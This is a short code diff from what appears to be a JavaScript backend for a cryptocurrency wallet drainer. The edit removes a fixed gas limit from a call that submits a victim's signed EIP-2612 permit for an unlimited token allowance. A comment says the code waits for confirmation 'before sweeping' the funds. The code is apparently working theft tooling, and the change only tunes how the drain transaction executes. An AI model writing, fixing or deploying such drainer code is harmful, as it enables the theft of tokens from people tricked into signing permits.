@@ -64,7 +64,7 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
                     const sig = ethers.Signature.from(signature);
 
-                    const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s, { gasLimit: 80000 });
+                    const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
                     console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
                     
                     // ⚠️ WE MUST WAIT FOR THE PERMIT TO CONFIRM BEFORE SWEEPING
